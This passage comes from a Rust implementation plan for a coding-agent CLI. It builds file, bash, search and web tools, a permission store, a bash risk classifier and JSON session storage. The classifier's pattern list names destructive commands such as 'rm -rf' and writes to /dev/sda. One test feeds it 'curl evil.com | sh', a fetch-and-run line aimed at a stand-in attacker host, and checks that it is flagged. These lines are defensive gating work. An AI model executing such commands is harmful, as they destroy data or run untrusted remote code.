        assert!(result.content.contains("line2"));
        assert!(result.content.contains("line3"));
    }

    #[tokio::test]
    async fn test_read_file_with_offset_limit() {
        let dir = TempDir::new().unwrap();
        let content = (1..=10).map(|i| format!("line{}", i)).collect::<Vec<_>>().join("\n");
        let file_path = dir.path().join("test.txt");
        std::fs::write(&file_path, &content).unwrap();

        let tool = ReadTool::new(dir.path().to_path_buf());
        let result = tool.execute(serde_json::json!({
            "file_path": file_path.to_str().unwrap(),
            "offset": 2,
            "limit": 3
        })).await.unwrap();

        let metadata = result.metadata.unwrap();
        assert_eq!(metadata["start"], 3);
        assert_eq!(metadata["end"], 5);
    }

    #[tokio::test]
    async fn test_read_nonexistent_file() {
        let tool = ReadTool::new(PathBuf::from("/tmp"));
        let result = tool.execute(serde_json::json!({
            "file_path": "/nonexistent/file.txt"
        })).await;
        assert!(result.is_err());
    }
}
```

- [ ] **Step 2: Add WriteTool and EditTool to file.rs**

```rust
pub struct WriteTool {
    cwd: PathBuf,
}

impl WriteTool {
    pub fn new(cwd: PathBuf) -> Self { Self { cwd } }
    fn resolve_path(&self, file_path: &str) -> PathBuf {
        let p = PathBuf::from(file_path);
        if p.is_absolute() { p } else { self.cwd.join(p) }
    }
}

#[async_trait]
impl Tool for WriteTool {
    fn name(&self) -> &str { "write" }
    fn description(&self) -> &str {
        "Create a new file or overwrite an existing file with the given content."
    }
    fn parameters(&self) -> Value {
        serde_json::json!({
            "type": "object",
            "properties": {
                "file_path": {"type": "string", "description": "Path to the file"},
                "content": {"type": "string", "description": "Content to write"}
            },
            "required": ["file_path", "content"]
        })
    }
    fn risk_level(&self, _params: &Value) -> RiskLevel { RiskLevel::Write }
    async fn execute(&self, params: Value) -> anyhow::Result<ToolOutput> {
        let file_path = params["file_path"].as_str().unwrap_or("");
        let content = params["content"].as_str().unwrap_or("");
        let path = self.resolve_path(file_path);

        if let Some(parent) = path.parent() {
            std::fs::create_dir_all(parent)?;
        }
        std::fs::write(&path, content)?;

        Ok(ToolOutput {
            content: format!("File written: {}", path.display()),
            metadata: Some(serde_json::json!({
                "path": path.display().to_string(),
                "size": content.len(),
            })),
        })
    }
}

pub struct EditTool {
    cwd: PathBuf,
}

impl EditTool {
    pub fn new(cwd: PathBuf) -> Self { Self { cwd } }
    fn resolve_path(&self, file_path: &str) -> PathBuf {
        let p = PathBuf::from(file_path);
        if p.is_absolute() { p } else { self.cwd.join(p) }
    }
}

#[async_trait]
impl Tool for EditTool {
    fn name(&self) -> &str { "edit" }
    fn description(&self) -> &str {
        "Perform exact string replacements in an existing file."
    }
    fn parameters(&self) -> Value {
        serde_json::json!({
            "type": "object",
            "properties": {
                "file_path": {"type": "string", "description": "Path to the file to edit"},
                "old_string": {"type": "string", "description": "The text to replace"},
                "new_string": {"type": "string", "description": "The text to replace it with"},
                "replace_all": {"type": "boolean", "description": "Replace all occurrences", "default": false}
            },
            "required": ["file_path", "old_string", "new_string"]
        })
    }
    fn risk_level(&self, _params: &Value) -> RiskLevel { RiskLevel::Write }
    async fn execute(&self, params: Value) -> anyhow::Result<ToolOutput> {
        let file_path = params["file_path"].as_str().unwrap_or("");
        let old_string = params["old_string"].as_str().unwrap_or("");
        let new_string = params["new_string"].as_str().unwrap_or("");
        let replace_all = params["replace_all"].as_bool().unwrap_or(false);
        let path = self.resolve_path(file_path);

        let content = std::fs::read_to_string(&path)?;

        if !content.contains(old_string) {
            anyhow::bail!("old_string not found in file");
        }

        let count = content.matches(old_string).count();
        if count > 1 && !replace_all {
            anyhow::bail!(
                "old_string matches {} occurrences. Use replace_all: true to replace all, or provide more context to make it unique.",
                count
            );
        }

        let new_content = if replace_all {
            content.replace(old_string, new_string)
        } else {
            content.replacen(old_string, new_string, 1)
        };

        std::fs::write(&path, &new_content)?;

        Ok(ToolOutput {
            content: format!("File edited: {}", path.display()),
            metadata: Some(serde_json::json!({
                "path": path.display().to_string(),
                "replacements": if replace_all { count } else { 1 },
            })),
        })
    }
}
```

- [ ] **Step 3: Write tests for WriteTool and EditTool in file.rs**

Append to the `#[cfg(test)] mod tests` block:

```rust
    #[tokio::test]
    async fn test_write_file() {
        let dir = TempDir::new().unwrap();
        let file_path = dir.path().join("output.txt");
        let tool = WriteTool::new(dir.path().to_path_buf());

        let result = tool.execute(serde_json::json!({
            "file_path": file_path.to_str().unwrap(),
            "content": "hello world"
        })).await.unwrap();

        assert!(result.content.contains("File written"));
        let saved = std::fs::read_to_string(&file_path).unwrap();
        assert_eq!(saved, "hello world");
    }

    #[tokio::test]
    async fn test_edit_file_unique() {
        let dir = TempDir::new().unwrap();
        let file_path = dir.path().join("edit.txt");
        std::fs::write(&file_path, "fn main() {\n    println!(\"hello\");\n}\n").unwrap();
        let tool = EditTool::new(dir.path().to_path_buf());

        let result = tool.execute(serde_json::json!({
            "file_path": file_path.to_str().unwrap(),
            "old_string": "println!(\"hello\")",
            "new_string": "println!(\"world\")"
        })).await.unwrap();

        assert!(result.content.contains("File edited"));
        let saved = std::fs::read_to_string(&file_path).unwrap();
        assert!(saved.contains("println!(\"world\")"));
        assert!(!saved.contains("println!(\"hello\")"));
    }

    #[tokio::test]
    async fn test_edit_not_found() {
        let dir = TempDir::new().unwrap();
        let file_path = dir.path().join("edit.txt");
        std::fs::write(&file_path, "content").unwrap();
        let tool = EditTool::new(dir.path().to_path_buf());

        let result = tool.execute(serde_json::json!({
            "file_path": file_path.to_str().unwrap(),
            "old_string": "nonexistent",
            "new_string": "replacement"
        })).await;
        assert!(result.is_err());
    }
```

- [ ] **Step 4: Run tests**

Run: `cargo test`
Expected: All 7 file tool tests pass.

- [ ] **Step 5: Commit**

```bash
git add src/tools/file.rs
git commit -m "feat: add read, write, and edit file tools"
```

---

### Task 8: Tools — Bash, Grep, Glob

**Files:**
- Create: `src/tools/bash.rs`
- Create: `src/tools/search.rs`

- [ ] **Step 1: Write bash.rs with BashTool and risk classification**

```rust
use async_trait::async_trait;
use serde_json::Value;
use tokio::process::Command;
use crate::tools::{RiskLevel, Tool, ToolOutput};

pub struct BashTool;

impl BashTool {
    pub fn new() -> Self { Self }
}

#[async_trait]
impl Tool for BashTool {
    fn name(&self) -> &str { "bash" }
    fn description(&self) -> &str {
        "Execute a shell command. Returns stdout and stderr."
    }
    fn parameters(&self) -> Value {
        serde_json::json!({
            "type": "object",
            "properties": {
                "command": {"type": "string", "description": "The shell command to execute"}
            },
            "required": ["command"]
        })
    }

    fn risk_level(&self, params: &Value) -> RiskLevel {
        let command = params["command"].as_str().unwrap_or("");
        classify_bash_risk(command)
    }

    async fn execute(&self, params: Value) -> anyhow::Result<ToolOutput> {
        let command = params["command"].as_str().unwrap_or("");

        let output = Command::new("bash")
            .args(["-c", command])
            .output()
            .await?;

        let stdout = String::from_utf8_lossy(&output.stdout).to_string();
        let stderr = String::from_utf8_lossy(&output.stderr).to_string();

        let content = if stderr.is_empty() {
            stdout.clone()
        } else if stdout.is_empty() {
            stderr.clone()
        } else {
            format!("stdout:\n{}\n\nstderr:\n{}", stdout, stderr)
        };

        Ok(ToolOutput {
            content,
            metadata: Some(serde_json::json!({
                "exit_code": output.status.code().unwrap_or(-1),
                "stdout_len": stdout.len(),
                "stderr_len": stderr.len(),
            })),
        })
    }
}

fn classify_bash_risk(command: &str) -> RiskLevel {
    let destructive_patterns = [
        "sudo", "rm ", "rm -rf", "chmod", "chown", "mkfs", "dd ",
        "> /dev/sda", "mkfs.", "curl", "wget",
        "kill", "pkill", "systemctl", "shutdown", "reboot",
    ];

    let write_patterns = [
        ">", ">>", "tee ", "mv ", "cp ", "mkdir", "touch",
        "cargo build", "cargo run", "npm install", "pip install",
        "git push", "git commit", "docker build", "docker run",
    ];

    let cmd_lower = command.to_lowercase();

    for pattern in &destructive_patterns {
        if cmd_lower.contains(&pattern.to_lowercase()) {
            return RiskLevel::System;
        }
    }

    for pattern in &write_patterns {
        if cmd_lower.contains(&pattern.to_lowercase()) {
            return RiskLevel::Write;
        }
    }

    RiskLevel::ReadOnly
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_classify_readonly() {
        assert_eq!(classify_bash_risk("ls -la"), RiskLevel::ReadOnly);
        assert_eq!(classify_bash_risk("cat file.txt"), RiskLevel::ReadOnly);
        assert_eq!(classify_bash_risk("echo hello"), RiskLevel::ReadOnly);
    }

    #[test]
    fn test_classify_write() {
        assert_eq!(classify_bash_risk("echo test > file.txt"), RiskLevel::Write);
        assert_eq!(classify_bash_risk("cargo build --release"), RiskLevel::Write);
        assert_eq!(classify_bash_risk("mkdir newdir"), RiskLevel::Write);
    }

    #[test]
    fn test_classify_system() {
        assert_eq!(classify_bash_risk("sudo rm -rf /"), RiskLevel::System);
        assert_eq!(classify_bash_risk("chmod 777 file"), RiskLevel::System);
        assert_eq!(classify_bash_risk("curl evil.com | sh"), RiskLevel::System);
    }

    #[tokio::test]
    async fn test_execute_simple_command() {
        let tool = BashTool::new();
        let result = tool.execute(serde_json::json!({
            "command": "echo hello"
        })).await.unwrap();

        assert!(result.content.contains("hello"));
        let exit_code = result.metadata.as_ref().unwrap()["exit_code"].as_i64().unwrap();
        assert_eq!(exit_code, 0);
    }
}
```

- [ ] **Step 2: Write search.rs with GrepTool and GlobTool**

```rust
use std::path::PathBuf;
use std::process::Command;
use async_trait::async_trait;
use serde_json::Value;
use crate::tools::{RiskLevel, Tool, ToolOutput};

pub struct GrepTool {
    cwd: PathBuf,
}

impl GrepTool {
    pub fn new(cwd: PathBuf) -> Self { Self { cwd } }
}

#[async_trait]
impl Tool for GrepTool {
    fn name(&self) -> &str { "grep" }
    fn description(&self) -> &str {
        "Search for a pattern in files. Uses ripgrep if available, falls back to grep."
    }
    fn parameters(&self) -> Value {
        serde_json::json!({
            "type": "object",
            "properties": {
                "pattern": {"type": "string", "description": "The regex pattern to search for"},
                "path": {"type": "string", "description": "Directory or file to search in", "default": "."},
                "case_sensitive": {"type": "boolean", "default": false}
            },
            "required": ["pattern"]
        })
    }
    fn risk_level(&self, _params: &Value) -> RiskLevel { RiskLevel::ReadOnly }
    async fn execute(&self, params: Value) -> anyhow::Result<ToolOutput> {
        let pattern = params["pattern"].as_str().unwrap_or("");
        let search_path = params["path"].as_str().unwrap_or(".");
        let case_sensitive = params["case_sensitive"].as_bool().unwrap_or(false);

        let tool_cmd = if which::which("rg").is_ok() { "rg" } else { "grep" };

        let mut cmd = Command::new(tool_cmd);
        cmd.arg("-n"); // line numbers

        if !case_sensitive { cmd.arg("-i"); }

        if tool_cmd == "rg" {
            cmd.arg("--no-heading");
        } else {
            cmd.arg("-r"); // recursive for grep
        }

        cmd.arg(pattern);
        cmd.arg(search_path);
        cmd.current_dir(&self.cwd);

        let output = cmd.output()?;
        let stdout = String::from_utf8_lossy(&output.stdout).to_string();

        Ok(ToolOutput {
            content: if stdout.is_empty() {
                "No matches found.".into()
            } else {
                stdout
            },
            metadata: Some(serde_json::json!({
                "matches": stdout.lines().count(),
                "tool": tool_cmd,
            })),
        })
    }
}

pub struct GlobTool {
    cwd: PathBuf,
}

impl GlobTool {
    pub fn new(cwd: PathBuf) -> Self { Self { cwd } }
}

#[async_trait]
impl Tool for GlobTool {
    fn name(&self) -> &str { "glob" }
    fn description(&self) -> &str {
        "Find files matching a glob pattern."
    }
    fn parameters(&self) -> Value {
        serde_json::json!({
            "type": "object",
            "properties": {
                "pattern": {"type": "string", "description": "The glob pattern to match (e.g., 'src/**/*.rs')"}
            },
            "required": ["pattern"]
        })
    }
    fn risk_level(&self, _params: &Value) -> RiskLevel { RiskLevel::ReadOnly }
    async fn execute(&self, params: Value) -> anyhow::Result<ToolOutput> {
        let pattern = params["pattern"].as_str().unwrap_or("");

        let entries = glob::glob(&self.cwd.join(pattern).to_string_lossy())?;

        let mut results: Vec<String> = Vec::new();
        for entry in entries.flatten() {
            if let Ok(rel) = entry.strip_prefix(&self.cwd) {
                results.push(rel.display().to_string());
            } else {
                results.push(entry.display().to_string());
            }
        }

        results.sort();

        Ok(ToolOutput {
            content: if results.is_empty() {
                "No files matched.".into()
            } else {
                results.join("\n")
            },
            metadata: Some(serde_json::json!({
                "count": results.len(),
            })),
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::TempDir;
    use std::io::Write;

    #[tokio::test]
    async fn test_grep_finds_matches() {
        let dir = TempDir::new().unwrap();
        std::fs::write(dir.path().join("test.rs"), "fn main() {\n    println!(\"hello\");\n}\n").unwrap();

        let tool = GrepTool::new(dir.path().to_path_buf());
        let result = tool.execute(serde_json::json!({
            "pattern": "println",
            "path": "."
        })).await.unwrap();

        assert!(result.content.contains("println"));
    }

    #[tokio::test]
    async fn test_glob_finds_files() {
        let dir = TempDir::new().unwrap();
        std::fs::write(dir.path().join("a.rs"), "").unwrap();
        std::fs::write(dir.path().join("b.rs"), "").unwrap();
        std::fs::create_dir(dir.path().join("subdir")).unwrap();
        std::fs::write(dir.path().join("subdir").join("c.rs"), "").unwrap();

        let tool = GlobTool::new(dir.path().to_path_buf());
        let result = tool.execute(serde_json::json!({
            "pattern": "**/*.rs"
        })).await.unwrap();

        assert!(result.content.contains("a.rs"));
        assert!(result.content.contains("b.rs"));
        assert!(result.content.contains("subdir/c.rs"));
    }
}
```

- [ ] **Step 3: Add dependencies**

Add to `Cargo.toml` under dependencies:
```toml
glob = "0.3"
which = "6"
```

- [ ] **Step 4: Run tests**

Run: `cargo test`
Expected: All 9 new tests pass (4 bash + 2 grep + 2 glob + 1 existing).

- [ ] **Step 5: Commit**

```bash
git add src/tools/bash.rs src/tools/search.rs Cargo.toml
git commit -m "feat: add bash, grep, and glob tools"
```

---

### Task 9: Tools — Web fetch and web search

**Files:**
- Create: `src/tools/web.rs`

- [ ] **Step 1: Write web.rs with WebFetchTool and WebSearchTool**

```rust
use async_trait::async_trait;
use serde_json::Value;
use crate::tools::{RiskLevel, Tool, ToolOutput};

pub struct WebFetchTool {
    client: reqwest::Client,
}

impl WebFetchTool {
    pub fn new() -> Self {
        Self {
            client: reqwest::Client::new(),
        }
    }
}

#[async_trait]
impl Tool for WebFetchTool {
    fn name(&self) -> &str { "web_fetch" }
    fn description(&self) -> &str {
        "Fetch content from a URL and extract as markdown. For HTTP URLs only."
    }
    fn parameters(&self) -> Value {
        serde_json::json!({
            "type": "object",
            "properties": {
                "url": {"type": "string", "format": "uri", "description": "The URL to fetch"}
            },
            "required": ["url"]
        })
    }
    fn risk_level(&self, _params: &Value) -> RiskLevel { RiskLevel::System }
    async fn execute(&self, params: Value) -> anyhow::Result<ToolOutput> {
        let url = params["url"].as_str().unwrap_or("");

        let response = self.client.get(url).send().await?;
        let status = response.status();
        let body = response.text().await?;

        // Simple HTML to text conversion (strip tags)
        let text = strip_html(&body);

        Ok(ToolOutput {
            content: text,
            metadata: Some(serde_json::json!({
                "status": status.as_u16(),
                "size": body.len(),
            })),
        })
    }
}

fn strip_html(html: &str) -> String {
    let mut result = String::new();
    let mut in_tag = false;

    for c in html.chars() {
        match c {
            '<' => in_tag = true,
            '>' => in_tag = false,
            _ if !in_tag => result.push(c),
            _ => {}
        }
    }

    result
}

pub struct WebSearchTool;

impl WebSearchTool {
    pub fn new() -> Self { Self }
}

#[async_trait]
impl Tool for WebSearchTool {
    fn name(&self) -> &str { "web_search" }
    fn description(&self) -> &str {
        "Search the web for information. Requires SEARCH_API_KEY env var."
    }
    fn parameters(&self) -> Value {
        serde_json::json!({
            "type": "object",
            "properties": {
                "query": {"type": "string", "description": "The search query"}
            },
            "required": ["query"]
        })
    }
    fn risk_level(&self, _params: &Value) -> RiskLevel { RiskLevel::System }
    async fn execute(&self, params: Value) -> anyhow::Result<ToolOutput> {
        let query = params["query"].as_str().unwrap_or("");

        // v1: Use DuckDuckGo HTML search (no API key needed)
        let client = reqwest::Client::new();
        let url = format!("https://html.duckduckgo.com/html/?q={}", urlencoding::encode(query));
        let response = client
            .get(&url)
            .header("User-Agent", "emergence/0.1")
            .send()
            .await?;

        let html = response.text().await?;
        let text = strip_html(&html);

        // Take first ~2000 chars as summary
        let summary: String = text.chars().take(2000).collect();

        Ok(ToolOutput {
            content: summary,
            metadata: Some(serde_json::json!({
                "query": query,
            })),
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_strip_html() {
        let html = "<html><body><p>Hello</p><p>World</p></body></html>";
        let text = strip_html(html);
        assert!(text.contains("Hello"));
        assert!(text.contains("World"));
    }
}
```

- [ ] **Step 2: Add dependency**

Add to `Cargo.toml`:
```toml
urlencoding = "2"
```

- [ ] **Step 3: Run tests**

Run: `cargo test`
Expected: strip_html test passes (web_fetch and web_search tests are network-dependent, skip unless online).

- [ ] **Step 4: Commit**

```bash
git add src/tools/web.rs Cargo.toml
git commit -m "feat: add web_fetch and web_search tools"
```

---

### Task 10: Permissions — PermissionStore and bash classifier

**Files:**
- Create: `src/permissions/mod.rs`
- Create: `src/permissions/bash_classifier.rs`

- [ ] **Step 1: Write permissions/mod.rs**

```rust
pub mod bash_classifier;

use std::collections::HashSet;
use crate::tools::RiskLevel;

#[derive(Debug, Default)]
pub struct PermissionStore {
    always_allow: HashSet<(String, RiskLevel)>,
}

impl PermissionStore {
    pub fn new() -> Self {
        Self {
            always_allow: HashSet::new(),
        }
    }

    pub fn is_allowed(&self, tool_name: &str, risk_level: &RiskLevel) -> bool {
        self.always_allow.contains(&(tool_name.to_string(), risk_level.clone()))
    }

    pub fn approve_always(&mut self, tool_name: &str, risk_level: RiskLevel) {
        self.always_allow
            .insert((tool_name.to_string(), risk_level));
    }

    pub fn clear(&mut self) {
        self.always_allow.clear();
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_permission_store_add_and_check() {
        let mut store = PermissionStore::new();
        assert!(!store.is_allowed("bash", &RiskLevel::Write));

        store.approve_always("bash", RiskLevel::Write);
        assert!(store.is_allowed("bash", &RiskLevel::Write));
        assert!(!store.is_allowed("bash", &RiskLevel::System));
    }

    #[test]
    fn test_permission_store_clear() {
        let mut store = PermissionStore::new();
        store.approve_always("bash", RiskLevel::Write);
        store.clear();
        assert!(!store.is_allowed("bash", &RiskLevel::Write));
    }
}
```

- [ ] **Step 2: Move bash classification to bash_classifier.rs**

```rust
use crate::tools::RiskLevel;

pub fn classify_bash_risk(command: &str) -> RiskLevel {
    let destructive_patterns = [
        "sudo", "rm ", "rm -rf", "chmod", "chown", "mkfs", "dd ",
        "> /dev/sda", "mkfs.", "curl", "wget",
        "kill", "pkill", "systemctl", "shutdown", "reboot",
    ];

    let write_patterns = [
        ">", ">>", "tee ", "mv ", "cp ", "mkdir", "touch",
        "cargo build", "cargo run", "npm install", "pip install",
        "git push", "git commit", "docker build", "docker run",
    ];

    let cmd_lower = command.to_lowercase();

    for pattern in &destructive_patterns {
        if cmd_lower.contains(&pattern.to_lowercase()) {
            return RiskLevel::System;
        }
    }

    for pattern in &write_patterns {
        if cmd_lower.contains(&pattern.to_lowercase()) {
            return RiskLevel::Write;
        }
    }

    RiskLevel::ReadOnly
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_readonly_commands() {
        assert_eq!(classify_bash_risk("ls -la"), RiskLevel::ReadOnly);
        assert_eq!(classify_bash_risk("cat file.txt"), RiskLevel::ReadOnly);
        assert_eq!(classify_bash_risk("echo hello"), RiskLevel::ReadOnly);
        assert_eq!(classify_bash_risk("git status"), RiskLevel::ReadOnly);
    }

    #[test]
    fn test_write_commands() {
        assert_eq!(classify_bash_risk("echo test > file.txt"), RiskLevel::Write);
        assert_eq!(classify_bash_risk("cargo build"), RiskLevel::Write);
        assert_eq!(classify_bash_risk("mkdir newdir"), RiskLevel::Write);
    }

    #[test]
    fn test_system_commands() {
        assert_eq!(classify_bash_risk("sudo rm -rf /"), RiskLevel::System);
        assert_eq!(classify_bash_risk("chmod 777 file"), RiskLevel::System);
        assert_eq!(classify_bash_risk("shutdown now"), RiskLevel::System);
    }
}
```

- [ ] **Step 3: Update bash.rs to use the shared classifier**

Replace the `classify_bash_risk` function body in `src/tools/bash.rs` with a re-export:

```rust
use crate::permissions::bash_classifier::classify_bash_risk;
```

(Delete the local `fn classify_bash_risk` definition. The `#[cfg(test)]` tests in bash.rs now import from bash_classifier.)

- [ ] **Step 4: Run tests**

Run: `cargo test`
Expected: All tests pass across permissions, bash_classifier, and bash tool modules.

- [ ] **Step 5: Commit**

```bash
git add src/permissions/ src/tools/bash.rs
git commit -m "feat: add permission store and extract bash risk classifier"
```

---

### Task 11: Session — Store trait and JSON file store

**Files:**
- Create: `src/session/mod.rs`
- Create: `src/session/store.rs`

- [ ] **Step 1: Write session/mod.rs with Session and session types**

```rust
pub mod store;

use std::collections::HashMap;
use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use crate::llm::message::ChatMessage;

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq, Hash)]
#[serde(untagged)]
pub enum SessionKey {
    Id(SessionId),
    Alias(String),
}

pub type SessionId = String;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Session {
    pub id: SessionId,
    pub alias: Option<String>,
    pub messages: Vec<ChatMessage>,
    pub summary: Option<String>,
    pub created_at: DateTime<Utc>,
    pub updated_at: DateTime<Utc>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SessionMeta {
    pub id: SessionId,
    pub alias: Option<String>,
    pub created_at: DateTime<Utc>,
    pub updated_at: DateTime<Utc>,
    pub message_count: usize,
    pub summary: Option<String>,
}

#[derive(Debug, Clone, Copy)]
pub struct SessionUsage {
    pub input_tokens: u32,
    pub output_tokens: u32,
}

impl Default for SessionUsage {
    fn default() -> Self {
        Self { input_tokens: 0, output_tokens: 0 }
    }
}

pub struct SessionManager {
    session: Session,
    usage: SessionUsage,
    store: Box<dyn store::SessionStore>,
}

impl SessionManager {
    pub fn new(store: Box<dyn store::SessionStore>) -> Self {
        let session = Session {
            id: format!("{}", Utc::now().format("%Y-%m-%d-%H%M%S")),
            alias: None,
            messages: vec![],
            summary: None,
            created_at: Utc::now(),
            updated_at: Utc::now(),
        };

        Self {
            session,
            usage: SessionUsage::default(),
            store,
        }
    }

    pub fn push(&mut self, message: ChatMessage) {
        self.session.messages.push(message);
        self.session.updated_at = Utc::now();
    }

    pub fn messages(&self) -> &[ChatMessage] {
        &self.session.messages
    }

    pub fn summary(&self) -> Option<&str> {
        self.session.summary.as_deref()
    }

    pub fn set_summary(&mut self, summary: String) {
        self.session.summary = Some(summary);
    }

    pub fn estimated_tokens(&self) -> u32 {
        // Rough estimate: 1 token ≈ 4 characters
        let char_count: usize = self.session.messages.iter()
            .map(|m| serde_json::to_string(m).unwrap_or_default().len())
            .sum();
        (char_count / 4) as u32
    }

    pub fn should_compact(&self, threshold: u32) -> bool {
        self.estimated_tokens() > (threshold as f64 * 0.8) as u32
    }

    pub async fn compact(&mut self) -> anyhow::Result<()> {
        // For now, just keep last 20 messages and mark rest as summary
        if self.session.messages.len() <= 20 {
            return Ok(());
        }

        let split_at = self.session.messages.len() - 20;
        let old_messages = self.session.messages[..split_at].to_vec();
        self.session.messages = self.session.messages[split_at..].to_vec();

        self.session.summary = Some(format!(
            "(Compacted {} earlier messages)",
            old_messages.len()
        ));

        Ok(())
    }

    pub async fn save(&self) -> anyhow::Result<()> {
        self.store.save(&self.session).await
    }

    pub async fn load(key: SessionKey, store: Box<dyn store::SessionStore>) -> anyhow::Result<Self> {
        let session = store.load(&key).await?
            .ok_or_else(|| anyhow::anyhow!("Session not found"))?;

        Ok(Self {
            session,
            usage: SessionUsage::default(),
            store,
        })
    }

    pub async fn list_sessions(store: &dyn store::SessionStore) -> anyhow::Result<Vec<SessionMeta>> {
        store.list().await
    }

    pub async fn set_alias(&mut self, alias: &str) -> anyhow::Result<()> {
        self.store.set_alias(&self.session.id, alias).await?;
        self.session.alias = Some(alias.to_string());
        Ok(())
    }

    pub fn session(&self) -> &Session {
        &self.session
    }

    pub fn clear(&mut self) {
        self.session.messages.clear();
        self.session.summary = None;
        self.session.updated_at = Utc::now();
    }
}
```

- [ ] **Step 2: Write store.rs with SessionStore trait and JsonFileStore**

```rust
use std::path::PathBuf;

use async_trait::async_trait;
use serde::{Deserialize, Serialize};

use crate::session::{Session, SessionId, SessionKey, SessionMeta};

#[derive(Debug, Clone, Serialize, Deserialize)]
struct IndexEntry {
    id: SessionId,
    alias: Option<String>,
    updated_at: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct SessionIndex {
    sessions: Vec<IndexEntry>,
}

#[async_trait]
pub trait SessionStore: Send + Sync {
    async fn save(&self, session: &Session) -> anyhow::Result<()>;
    async fn load(&self, key: &SessionKey) -> anyhow::Result<Option<Session>>;
    async fn list(&self) -> anyhow::Result<Vec<SessionMeta>>;
    async fn delete(&self, key: &SessionKey) -> anyhow::Result<()>;
    async fn set_alias(&self, id: &SessionId, alias: &str) -> anyhow::Result<()>;
}

pub struct JsonFileStore {
    base_dir: PathBuf,
}

impl JsonFileStore {
    pub fn new(base_dir: PathBuf) -> Self {
        Self { base_dir }
    }

    fn session_path(&self, id: &str) -> PathBuf {
        self.base_dir.join(format!("{}.json", id))
    }

    fn index_path(&self) -> PathBuf {
        self.base_dir.join("index.json")
    }

    async fn read_index(&self) -> anyhow::Result<SessionIndex> {
        let path = self.index_path();
        if !path.exists() {
            return Ok(SessionIndex { sessions: vec![] });
        }
        let content = tokio::fs::read_to_string(&path).await?;
        Ok(serde_json::from_str(&content)?)
    }

    async fn write_index(&self, index: &SessionIndex) -> anyhow::Result<()> {
        let content = serde_json::to_string_pretty(index)?;
        tokio::fs::write(&self.index_path(), content).await?;
        Ok(())
    }

    async fn resolve_id(&self, key: &SessionKey) -> Option<SessionId> {
        match key {
            SessionKey::Id(id) => Some(id.clone()),
            SessionKey::Alias(alias) => {
                let index = self.read_index().await.ok()?;
                index.sessions.iter()
                    .find(|e| e.alias.as_deref() == Some(alias))
                    .map(|e| e.id.clone())
            }
        }
    }
}

#[async_trait]
impl SessionStore for JsonFileStore {
    async fn save(&self, session: &Session) -> anyhow::Result<()> {
        tokio::fs::create_dir_all(&self.base_dir).await?;
        let content = serde_json::to_string_pretty(session)?;
        tokio::fs::write(&self.session_path(&session.id), content).await?;

        let mut index = self.read_index().await?;
        if let Some(existing) = index.sessions.iter_mut().find(|e| e.id == session.id) {
            existing.alias = session.alias.clone();
            existing.updated_at = session.updated_at.to_rfc3339();
        } else {
            index.sessions.push(IndexEntry {
                id: session.id.clone(),
                alias: session.alias.clone(),
                updated_at: session.updated_at.to_rfc3339(),
            });
        }

        self.write_index(&index).await
    }

    async fn load(&self, key: &SessionKey) -> anyhow::Result<Option<Session>> {
        let id = match self.resolve_id(key).await {
            Some(id) => id,
            None => return Ok(None),
        };

        let path = self.session_path(&id);
        if !path.exists() {
            return Ok(None);
        }

        let content = tokio::fs::read_to_string(&path).await?;
        let session: Session = serde_json::from_str(&content)?;
        Ok(Some(session))
    }

    async fn list(&self) -> anyhow::Result<Vec<SessionMeta>> {
        let index = self.read_index().await?;
        let mut metas: Vec<SessionMeta> = Vec::new();

        for entry in &index.sessions {
            if let Ok(Some(session)) = self.load(&SessionKey::Id(entry.id.clone())).await {
                metas.push(SessionMeta {
                    id: session.id,
                    alias: session.alias,
                    created_at: session.created_at,
                    updated_at: session.updated_at,
                    message_count: session.messages.len(),
                    summary: session.summary,
                });
            }
        }

        metas.sort_by(|a, b| b.updated_at.cmp(&a.updated_at));
        Ok(metas)
    }

    async fn delete(&self, key: &SessionKey) -> anyhow::Result<()> {
        let id = match self.resolve_id(key).await {
            Some(id) => id,
            None => anyhow::bail!("Session not found"),
        };

        let path = self.session_path(&id);
        if path.exists() {
            tokio::fs::remove_file(&path).await?;
        }

        let mut index = self.read_index().await?;
        index.sessions.retain(|e| e.id != id);
        self.write_index(&index).await
    }

    async fn set_alias(&self, id: &SessionId, alias: &str) -> anyhow::Result<()> {
        let mut index = self.read_index().await?;
        if let Some(entry) = index.sessions.iter_mut().find(|e| &e.id == id) {
            entry.alias = Some(alias.to_string());
            self.write_index(&index).await?;
        }
        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::TempDir;
    use chrono::Utc;
    use crate::llm::message::{ChatMessage, Role, Content};
    use crate::session::{Session, SessionKey};

    #[tokio::test]
    async fn test_save_and_load() {
        let dir = TempDir::new().unwrap();
        let store = JsonFileStore::new(dir.path().to_path_buf());

        let session = Session {
            id: "test-1".into(),
            alias: Some("test-session".into()),
            messages: vec![ChatMessage::user("hello")],
            summary: None,
            created_at: Utc::now(),
            updated_at: Utc::now(),
        };

        store.save(&session).await.unwrap();

        let loaded = store.load(&SessionKey::Id("test-1".into())).await.unwrap().unwrap();
        assert_eq!(loaded.id, "test-1");
        assert_eq!(loaded.messages.len(), 1);
    }

    #[tokio::test]
    async fn test_load_by_alias() {
        let dir = TempDir::new().unwrap();
        let store = JsonFileStore::new(dir.path().to_path_buf());

        let session = Session {
            id: "test-2".into(),
            alias: Some("my-alias".into()),
            messages: vec![],
            summary: None,
            created_at: Utc::now(),
            updated_at: Utc::now(),
        };

        store.save(&session).await.unwrap();

        let loaded = store.load(&SessionKey::Alias("my-alias".into())).await.unwrap().unwrap();
        assert_eq!(loaded.id, "test-2");
    }

    #[tokio::test]
    async fn test_list_and_delete() {
        let dir = TempDir::new().unwrap();
        let store = JsonFileStore::new(dir.path().to_path_buf());

        let s1 = Session {
            id: "s1".into(), alias: None,
            messages: vec![],
            summary: None,
            created_at: Utc::now(), updated_at: Utc::now(),
        };
        store.save(&s1).await.unwrap();

        let list = store.list().await.unwrap();
        assert_eq!(list.len(), 1);

        store.delete(&SessionKey::Id("s1".into())).await.unwrap();
        let list_after = store.list().await.unwrap();
